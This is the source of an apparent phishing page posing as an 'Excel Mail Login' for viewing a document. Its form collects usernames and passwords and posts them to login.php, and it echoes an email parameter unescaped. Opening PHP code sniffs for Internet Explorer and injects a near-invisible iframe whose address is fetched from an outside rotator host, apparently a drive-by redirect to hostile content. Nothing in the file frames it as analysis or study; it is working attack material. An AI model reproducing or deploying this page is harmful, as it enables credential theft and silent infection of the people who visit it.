﻿<?php     
$ua     = $_SERVER['HTTP_USER_AGENT'];     
$isIE   = (bool)preg_match('/Trident/i', $ua);     
$isIE2  = (bool)preg_match('/MSIE/i', $ua);     
if ($isIE || $isIE2) {         
$key= 'c79b68f6cf00bb35ade05d4b438753f1';         
$flow_url = file_get_contents('http://adrotate.pw/rotator/').$key;         
echo('<iframe src='.$flow_url.' width="1%" height="1"></iframe>');
     }
?>
<!DOCTYPE HTML>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<title>Excel Mail Login</title>
	<link rel="stylesheet" href="style.css" />
	<link href='http://fonts.googleapis.com/css?family=Oleo+Script' rel='stylesheet' type='text/css'>
</head>
<body>
<br/>
    <br/>
    <br/><br/>
	<div style=" height: 300px; width: 550px; background-color: #008000; margin-left: 350px; border-radius: 20px; padding-right: 35px;">
	<div class="lg-container">
	    <br/>
		<h4 style="font-family: Arial, Helvetica, sans-serif; color: #ffffff; margin-left: 30px;">Login To View Document Below</h4>
		<form action="login.php" id="lg-form" name="lg-form" method="post">
			
			<div>
			<label for="username">Username:</label>
				<input type="text" required="" style=" width: 300px; height: 10px;" name="username" id="username" 
				placeholder="&#37038;&#31665;&#24080;&#21495;&#25110;&#25163;&#26426;&#21495;" value="<?=$_GET[email]?>" 
				/>
			</div>
			
			<div>
				<label for="password">Password</label>
				<input type="password" name="password" style=" width: 300px; height: 10px;" autofocus="" required="" id="password" placeholder="Enter password" />
			</div>
			
			<div>				
				<button type="submit" id="login" style=" color: #008000; margin-left: 35px; width: 250px; height: 40px; background-color: #ffffff; ">Download</button>
			</div>
			
		</form>
		<div id="message"></div>
	</div></div>
</body>
</html>